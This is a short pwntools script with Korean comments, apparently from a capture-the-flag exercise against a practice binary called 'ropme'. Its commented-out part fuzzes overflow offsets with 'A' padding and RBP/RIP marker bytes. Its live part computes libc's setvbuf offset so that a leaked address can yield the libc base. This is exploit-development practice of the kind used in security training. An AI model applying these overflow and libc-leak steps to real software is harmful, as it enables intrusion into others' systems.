# from pwn import *
# import time

# # 디버깅을 위한 컨텍스트 설정
# context.log_level = 'debug'

# # 바이너리 파일 로드
# elf = ELF('./ropme')

# # 다양한 오프셋 테스트를 위한 함수
# def test_with_offset(offset):
#     print(f"\nTesting with offset: {offset}")
    
#     p = process('./ropme')
    
#     # setvbuf 주소 받기
#     setvbuf = p.recvline()
#     print(f"setvbuf address: {setvbuf}")
    
#     # 페이로드 생성
#     payload = b'A' * offset           # 버퍼 채우기
#     payload += b'BBBBBBBB'           # RBP 마커
#     payload += b'CCCCCCCC'           # RIP 마커
    
#     # 페이로드 전송
#     p.clean()
#     p.sendline(payload)
    
#     # 잠시 대기
#     time.sleep(0.5)
    
#     try:
#         result = p.poll()
#         if result is None:
#             print("Program is still running")
#         else:
#             print(f"Program exited with code: {result}")
#     except:
#         print("Program crashed!")
    
#     p.close()

# # 여러 오프셋으로 테스트
# for offset in [32, 36, 40, 44, 48]:
#     test_with_offset(offset)

# setvbuf_offset을 찾기 위해:
from pwn import *

libc = ELF('./libc.so.6')
setvbuf_offset = libc.symbols['setvbuf']
print(f"setvbuf offset: {hex(setvbuf_offset)}")

# libc 베이스 = setvbuf 주소 - setvbuf offset